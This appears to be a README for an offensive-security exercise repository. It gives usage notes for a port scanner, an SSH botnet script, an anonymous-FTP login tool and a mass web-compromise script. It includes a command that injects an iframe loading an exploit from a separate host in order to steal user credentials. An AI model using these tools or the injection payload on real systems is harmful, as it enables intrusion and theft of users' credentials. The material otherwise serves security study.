# Digital-Forensic-Analytics
Forensic Investigation, Network Traffic Analysis, Penetration Testing, Antivirus Evasion, Web recon


# Penetration Testing  
## PortScan.py  

In the command Line pass the port argument as a string i.e in " " for multiple port like follow;  
taymour:∼# python portScan.py -H 10.50.60.125 -p "21, 1720"  
  
  
## H) botNet.py

Change IP, Root, Password to issue SSH commands on compromised machines

## I) anonLogin.py  
  
First you have to allow /etc/vsftpd.conf file to enable anon_login to yes or uncomment it

## L) massCompromise.py
In command line following options are required to attack wb pages and inject your own html file to steal compromised user credentials in default location

attacker# python massCompromise.py -H 192.168.95.179 -r '<iframe src="
http://10.10.10.112:8080/exploit"></iframe>' -f userpass.txt
